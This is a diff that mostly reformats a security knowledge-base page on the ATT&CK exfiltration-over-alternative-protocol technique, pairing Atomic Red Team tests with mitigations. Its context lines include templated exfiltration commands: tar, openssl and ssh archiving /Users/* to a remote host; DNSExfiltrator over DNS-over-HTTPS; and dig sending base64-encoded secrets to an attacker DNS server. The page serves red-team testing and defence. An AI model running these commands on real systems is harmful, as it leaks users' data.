@@ -46,8 +46,7 @@ chains_with:
   - T1048.001
   - T1048.002
   - T1048.003
-prerequisites:
-  []
+prerequisites: []
 severity_boost:
   T1048.001: "Chain with T1048.001 for deeper attack path"
   T1048.002: "Chain with T1048.002 for deeper attack path"
@@ -58,9 +57,9 @@ severity_boost:
 
 ## High-Level Description
 
-Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 
+Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.
 
-Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 
+Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels.
 
 Exfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.
 
@@ -107,7 +106,7 @@ Input a domain and test Exfiltration over SSH
 
 Local to Remote
 
-Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.
+Upon successful execution, tar will compress /Users/\* directory and password protect the file modification of `Users.tar.gz.enc` as output.
 
 **Supported Platforms:** macos, linux
 
@@ -118,7 +117,7 @@ tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{
 ### Atomic Test 3: DNSExfiltration (doh)
 
 DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.
-!!! Test will fail without a domain under your control with A record and NS record !!! 
+!!! Test will fail without a domain under your control with A record and NS record !!!
 See this github page for more details - https://github.com/Arno0x/DNSExfiltrator
 
 **Supported Platforms:** windows
@@ -129,11 +128,12 @@ Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} 
 ```
 
 **Dependencies:**
+
 - DNSExfiltrator powershell file must exist on disk at specified location (#{ps_module})
 
 ### Atomic Test 4: Exfiltrate Data using DNS Queries via dig
 
-This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and 
+This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and
 making DNS queries via the dig command to a controlled DNS server.
 
 **Supported Platforms:** macos, linux
@@ -143,8 +143,8 @@ dig @#{attacker_dns_server} -p #{dns_port} $(echo "#{secret_info}" | base64).goo
 ```
 
 **Dependencies:**
-- dig command
 
+- dig command
 
 ### Manual Testing
 
@@ -159,41 +159,44 @@ If Atomic Red Team tests are not applicable, manually verify the technique by:
 ## Remediation Guide
 
 ### M1030 Network Segmentation
+
 Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.
 
 ### M1057 Data Loss Prevention
+
 Data loss prevention can detect and block sensitive data being uploaded via web browsers.
 
 ### M1037 Filter Network Traffic
+
 Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP allowlisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data.
 
 ### M1031 Network Intrusion Prevention
+
 Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.
 
 ### M1022 Restrict File and Directory Permissions
+
 Use access control lists on cloud storage systems and objects.
 
 ### M1018 User Account Management
-Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary.
 
+Configure user permissions groups and roles for access to cloud storage. Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary.
 
 ## Detection
 
 ### Behavioral Detection Strategy for Exfiltration Over Alternative Protocol
 
-
 ## Risk Assessment
 
-| Finding | Severity | Impact |
-| ------- | -------- | ------ |
-| Exfiltration Over Alternative Protocol technique applicable | Medium | Exfiltration |
+| Finding                                                     | Severity | Impact       |
+| ----------------------------------------------------------- | -------- | ------------ |
+| Exfiltration Over Alternative Protocol technique applicable | Medium   | Exfiltration |
 
 ## CWE Categories
 
-| CWE ID | Title |
-| ------ | ----- |
+| CWE ID  | Title                             |
+| ------- | --------------------------------- |
 | CWE-200 | Exposure of Sensitive Information |
-
 
 ## References
 
